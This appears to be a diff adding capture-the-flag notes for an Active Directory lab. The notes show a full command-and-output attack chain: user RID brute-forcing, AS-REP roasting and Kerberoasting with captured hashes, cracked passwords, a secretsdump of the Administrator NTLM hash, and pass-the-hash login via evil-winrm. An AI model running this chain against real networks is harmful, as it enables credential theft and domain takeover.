@@ -1,0 +1,67 @@
+
+#smb -L 10.10.173.97
+
+
+Bruteforcing SID users with crackmapexec (or) impacket
+-------------------------------------------------------
+crackmapexec smb 10.10.173.97 -u lee -p "" --rid-brute
+						(or)
+
+impacket-lookupsid vulnnet-rst.local/lee@10.10.33.231
+
+
+
+Kerborasting(ticket-granting service)
+--------------------------------------
+impacket-GetNPUsers vulnnet-rst.local/ -no-pass -usersfile enumerated_users
+
+
+
+$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:636970eb62cc3dbbd701b2085bdb48fa$a16148fc457b33d21c2995bebf3e674cfd0009f83a516f2aa1fd2d018314fd374e4e61e026c646607217bc8c639db747db9b4f39f90b54362f4363bbc0c16e3c304d1ae4c8a5e7cd765062e3459be9a05922b453bc083e25d4b4ff9eecc14c22bdbce66539b38ead0cafeb6895d9486a45c13f612a9033d78ad144f306a6351a675d1d083aa4fc4180c42b62ca11cd814d60273b0b33de8f577f11c288e1bcb377c46030b64e5307e57ce7033b7f55a1eb0b15a734841096ce523eacc07fecdb5ab4972bf7048c1294fd01a547b6ab5238985d0341a3bb40a465a676eb0d374fa4f5f741ebb6180143f4192fa764034eab5161c544e5
+
+
+password= tj072889*
+
+Kerborasting to another user
+-----------------------------
+impacket-GetUserSPNs vulnnet-rst.local/t-skid:tj072889* -dc-ip 10.10.33.231 -request
+
+$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$804ccaf8c64ece9eca8f6f92d54053c9$67b5e0986f6f757e7e22127dbceed69951d911cb4880226a39085383b82cfdd0c36bab54eff942c52e90f89d2f2c8a7521849cf52d69ed61c0cc291cd948ce07ba26df958b4c0778fe167b5126737bb602b28f0071af7a5c9b2779722612c9637ff355757d1f620c6a14a1e490b695e3409e8d29a4b07530c639a4dbe422c445c05889ab68e3bf2b22069809ffda4e32ab0f763fae038c04ffdcba87681c2bdb06312cdd8d1ff421c5b3a97fbe0f90deeb13813332644267970ad22cbaca9d7fd474a31abc615baba1a9f50e697291878b96d38a85b564da2dea6e36fe4e3df5a2df27f3eeda7337af7aeeb0dd3665116c3f27a349eca4d83b0f78664225b65faa93766bfb9822fdee35b0fa353c529e559f40cb0b6aa1196b1a841971f516ccb0746075dbb93f01a3fc376f4446649d091b0ee6fc066dbf5619c6c3ca5d67414e57c12f3eb0dfbbba491dfcabdcc464cb305cf46800df50ec51fdc9bebf4117bca76eaf175840e7cb2f0bb386bd674c7c190b3547c3fe3f6d1da8072400e910315456b1398bc9815fa9e1e5dafa72dd6824e68c5a8fd7a8969c482fca9c789ced9798bcf0583219bc11e3534260274ea48f27815005eeca8bdd34cd1e7a6e1073c4ee4aa81127076a576a088efe80403e64d285a54fb4cee49016f989ff18d220e5b41626d9155eccaa216ddddcf5d08efeb680e03b0bd052797c1777331edac7d7ff694b89464985bedb58dc50a721be36d367e686352dbe4718a1b2f81d3668df32c5ad5e77ab64a1abe6d40b622b6c9510e6477ccd2eeb7ddc2a9427750ff01ff7c70130f6fcdef2406022a1d4d687bdceac21109e93b01ae7fd3dd30cc197328e0f65f5048dc82ab2daf40ede51f622a50b11039c9cd815db649f8c607a4ea87799718c6274a8ae26103bf213846eb939813ba4c240a5e3afffebb81e1127c22c755085f314e901d2d6248e4069940033a046b1c64d568dc74febafe593ca46cacff302a8c699afb71ba872aa51ecd8f54a0947549fead4e3c82e142dc66ec081e69aa189703ff8df1a490475326f839fc3b0896c76afcad141aa6820e223f640eff081ebfc67b66556dba05cd2d05657f1bef40bdcd0914a118c0b343ef62c28fbf687db5d3240b80139e370d4645978285b23affc32e3aed85eec0b57cad2ec0acbd40866bcc178cf4baf8e2c79475c7cfcad4e35b127a7d4f4e7903ca6ec905e17145281177ab8e69976c1d5383c1bdbf6c3e20c4608a5c33ecc4be4f2d20382a0ecf39ad0f25f3a677fbad681339dfe722d226316f21dc92a8aa41b71d919cd561d1e410a183c95513c73b31cfa410e34aed37efacc1ef3a02e72b123d408fb907e82acc41af593d124851cbcb775881a931802d7db71e585
+
+
+password= ry=ibfkfv,s6h,
+
+Getting into AD with evil-winrm
+--------------------------------
+#evil-winrm -i 10.10.248.119 -u enterprise-core-vn -p ry=ibfkfv,s6h,
+
+
+strUserNTName = "a-whitehat"
+strPassword = "bNdKVkjv3RR9ht"
+
+
+smbclient //10.10.248.119/NETLOGON -U enterprise-core-vn (it displays)
+-----------------------------------------------------------------------
+
+strUserNTName = "a-whitehat"
+strPassword = "bNdKVkjv3RR9ht"
+
+
+I tested those credentials using crackmapexec. Looking at the screenshot below we get (a pwned) signed meaning we can use psexec to get an administrator’s shell on the box
+
+#crackmapexec smb 10.10.248.119 -u a-whitehat -p "bNdKVkjv3RR9ht"
+
+
+dump the secret file (to know ntlm hash)
+---------------------
+#impacket-secretsdump vulnnet-rst.local/a-whitehat@10.10.248.119 
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
+
+
+c2597747aa5e43022a3a3049a3c3b09d(NTLM hash)
+
+
+Finally get the Administrator
+-------------------------------
+#evil-winrm -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d -i 10.10.248.119 -N
